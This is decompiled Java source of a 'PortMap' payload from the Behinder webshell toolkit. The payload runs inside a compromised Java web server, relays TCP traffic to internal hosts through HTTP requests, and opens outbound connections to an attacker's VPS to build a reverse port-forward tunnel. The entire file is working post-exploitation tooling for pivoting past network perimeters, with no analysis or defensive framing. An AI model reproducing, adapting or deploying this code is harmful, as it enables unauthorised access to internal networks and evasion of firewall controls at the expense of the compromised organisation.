// 
// Decompiled by Procyon v0.5.36
// 

package net.rebeyond.behinder.payload.java;

import java.io.OutputStream;
import java.util.Enumeration;
import javax.servlet.ServletOutputStream;
import java.nio.ByteBuffer;
import java.io.IOException;
import java.net.SocketAddress;
import java.net.InetSocketAddress;
import java.nio.channels.SocketChannel;
import javax.servlet.jsp.PageContext;
import javax.servlet.http.HttpSession;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpServletRequest;

public class PortMap implements Runnable
{
    public static String action;
    public static String targetIP;
    public static String targetPort;
    public static String socketHash;
    public static String remoteIP;
    public static String remotePort;
    public static String extraData;
    private HttpServletRequest Request;
    private HttpServletResponse Response;
    private HttpSession Session;
    String localKey;
    String remoteKey;
    String type;
    HttpSession httpSession;
    
    @Override
    public boolean equals(final Object obj) {
        final PageContext page = (PageContext)obj;
        this.Session = page.getSession();
        this.Response = (HttpServletResponse)page.getResponse();
        this.Request = (HttpServletRequest)page.getRequest();
        try {
            this.portMap(page);
        }
        catch (Exception ex) {}
        return true;
    }
    
    public void portMap(final PageContext page) throws Exception {
        final String localSessionKey = "local_" + PortMap.targetIP + "_" + PortMap.targetPort + "_" + PortMap.socketHash;
        if (PortMap.action.equals("createLocal")) {
            try {
                final String target = PortMap.targetIP;
                final int port = Integer.parseInt(PortMap.targetPort);
                final SocketChannel socketChannel = SocketChannel.open();
                socketChannel.connect(new InetSocketAddress(target, port));
                socketChannel.configureBlocking(false);
                this.Session.setAttribute(localSessionKey, (Object)socketChannel);
                this.Response.setStatus(200);
            }
            catch (Exception e) {
                e.printStackTrace();
                ServletOutputStream so = null;
                try {
                    so = this.Response.getOutputStream();
                    so.write(new byte[] { 55, 33, 73, 54 });
                    so.write(e.getMessage().getBytes());
                    so.flush();
                    so.close();
                }
                catch (IOException ioException) {
                    ioException.printStackTrace();
                }
            }
        }
        else if (PortMap.action.equals("read")) {
            final SocketChannel socketChannel2 = (SocketChannel)this.Session.getAttribute(localSessionKey);
            if (socketChannel2 == null) {
                return;
            }
            try {
                final ByteBuffer buf = ByteBuffer.allocate(512);
                socketChannel2.configureBlocking(false);
                int bytesRead = socketChannel2.read(buf);
                final ServletOutputStream so2 = this.Response.getOutputStream();
                while (bytesRead > 0) {
                    so2.write(buf.array(), 0, bytesRead);
                    so2.flush();
                    buf.clear();
                    bytesRead = socketChannel2.read(buf);
                }
                so2.flush();
                so2.close();
            }
            catch (Exception e2) {
                e2.printStackTrace();
                this.Response.setStatus(200);
                ServletOutputStream so3 = null;
                try {
                    so3 = this.Response.getOutputStream();
                    so3.write(new byte[] { 55, 33, 73, 54 });
                    so3.write(e2.getMessage().getBytes());
                    so3.flush();
                    so3.close();
                    socketChannel2.socket().close();
                }
                catch (IOException ioException2) {
                    ioException2.printStackTrace();
                }
            }
        }
        else if (PortMap.action.equals("write")) {
            final SocketChannel socketChannel2 = (SocketChannel)this.Session.getAttribute(localSessionKey);
            try {
                final byte[] extraDataByte = this.base64decode(PortMap.extraData);
                final ByteBuffer buf2 = ByteBuffer.allocate(extraDataByte.length);
                buf2.clear();
                buf2.put(extraDataByte);
                buf2.flip();
                while (buf2.hasRemaining()) {
                    socketChannel2.write(buf2);
                }
            }
            catch (Exception e2) {
                ServletOutputStream so3 = null;
                try {
                    so3 = this.Response.getOutputStream();
                    so3.write(new byte[] { 55, 33, 73, 54 });
                    so3.write(e2.getMessage().getBytes());
                    so3.flush();
                    so3.close();
                    socketChannel2.socket().close();
                }
                catch (IOException ioException2) {
                    ioException2.printStackTrace();
                }
            }
        }
        else if (PortMap.action.equals("closeLocal")) {
            final Enumeration attributeNames = this.Session.getAttributeNames();
            while (attributeNames.hasMoreElements()) {
                final String attrName = attributeNames.nextElement().toString();
                if (attrName.startsWith("local_")) {
                    this.Session.removeAttribute(attrName);
                }
            }
        }
        else if (PortMap.action.equals("createRemote")) {
            new Thread(new PortMap(this.localKey, this.remoteKey, "create", this.Session)).start();
            this.Response.setStatus(200);
        }
        else if (PortMap.action.equals("closeRemote")) {
            this.Session.setAttribute("remoteRunning", (Object)false);
            final Enumeration attributeNames = this.Session.getAttributeNames();
            while (attributeNames.hasMoreElements()) {
                final String attrName = attributeNames.nextElement().toString();
                if (attrName.startsWith("remote")) {
                    this.Session.removeAttribute(attrName);
                }
            }
        }
    }
    
    public PortMap(final String localKey, final String remoteKey, final String type, final HttpSession session) {
        this.localKey = localKey;
        this.remoteKey = remoteKey;
        this.httpSession = session;
        this.type = type;
    }
    
    public PortMap() {
    }
    
    @Override
    public void run() {
        if (this.type.equals("create")) {
            this.httpSession.setAttribute("remoteRunning", (Object)true);
            while ((boolean)this.httpSession.getAttribute("remoteRunning")) {
                try {
                    final String target = PortMap.targetIP;
                    final int port = Integer.parseInt(PortMap.targetPort);
                    final String vps = PortMap.remoteIP;
                    final int vpsPort = Integer.parseInt(PortMap.remotePort);
                    final SocketChannel remoteSocketChannel = SocketChannel.open();
                    remoteSocketChannel.connect(new InetSocketAddress(vps, vpsPort));
                    final String remoteKey = "remote_remote_" + remoteSocketChannel.socket().getLocalPort() + "_" + PortMap.targetIP + "_" + PortMap.targetPort;
                    this.httpSession.setAttribute(remoteKey, (Object)remoteSocketChannel);
                    int bytesRead = 0;
                    final ByteBuffer buf = ByteBuffer.allocate(512);
                    if ((bytesRead = remoteSocketChannel.read(buf)) <= 0) {
                        continue;
                    }
                    remoteSocketChannel.configureBlocking(true);
                    final SocketChannel localSocketChannel = SocketChannel.open();
                    localSocketChannel.connect(new InetSocketAddress(target, port));
                    localSocketChannel.configureBlocking(true);
                    final String localKey = "remote_local_" + localSocketChannel.socket().getLocalPort() + "_" + PortMap.targetIP + "_" + PortMap.targetPort;
                    this.httpSession.setAttribute(localKey, (Object)localSocketChannel);
                    localSocketChannel.socket().getOutputStream().write(buf.array(), 0, bytesRead);
                    new Thread(new PortMap(localKey, remoteKey, "read", this.httpSession)).start();
                    new Thread(new PortMap(localKey, remoteKey, "write", this.httpSession)).start();
                }
                catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
        else if (this.type.equals("read")) {
            while ((boolean)this.httpSession.getAttribute("remoteRunning")) {
                try {
                    final SocketChannel localSocketChannel2 = (SocketChannel)this.httpSession.getAttribute(this.localKey);
                    final SocketChannel remoteSocketChannel2 = (SocketChannel)this.httpSession.getAttribute(this.remoteKey);
                    final ByteBuffer buf2 = ByteBuffer.allocate(512);
                    int bytesRead2 = localSocketChannel2.read(buf2);
                    final OutputStream so = remoteSocketChannel2.socket().getOutputStream();
                    while (bytesRead2 > 0) {
                        so.write(buf2.array(), 0, bytesRead2);
                        so.flush();
                        buf2.clear();
                        bytesRead2 = localSocketChannel2.read(buf2);
                    }
                    so.flush();
                    so.close();
                }
                catch (IOException e2) {
                    try {
                        Thread.sleep(10L);
                    }
                    catch (Exception ex) {}
                }
            }
        }
        else if (this.type.equals("write")) {
            while ((boolean)this.httpSession.getAttribute("remoteRunning")) {
                try {
                    final SocketChannel localSocketChannel2 = (SocketChannel)this.httpSession.getAttribute(this.localKey);
                    final SocketChannel remoteSocketChannel2 = (SocketChannel)this.httpSession.getAttribute(this.remoteKey);
                    final ByteBuffer buf2 = ByteBuffer.allocate(512);
                    int bytesRead2 = remoteSocketChannel2.read(buf2);
                    final OutputStream so = localSocketChannel2.socket().getOutputStream();
                    while (bytesRead2 > 0) {
                        so.write(buf2.array(), 0, bytesRead2);
                        so.flush();
                        buf2.clear();
                        bytesRead2 = remoteSocketChannel2.read(buf2);
                    }
                    so.flush();
                    so.close();
                }
                catch (IOException e2) {
                    try {
                        Thread.sleep(10L);
                    }
                    catch (Exception ex2) {}
                }
            }
        }
    }
    
    private byte[] base64decode(final String text) throws Exception {
        final String version = System.getProperty("java.version");
        byte[] result = null;
        try {
            if (version.compareTo("1.9") >= 0) {
                this.getClass();
                final Class Base64 = Class.forName("java.util.Base64");
                final Object Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
                result = (byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, text);
            }
            else {
                this.getClass();
                final Class Base64 = Class.forName("sun.misc.BASE64Decoder");
                final Object Decoder = Base64.newInstance();
                result = (byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, text);
            }
        }
        catch (Exception ex) {}
        return result;
    }
}
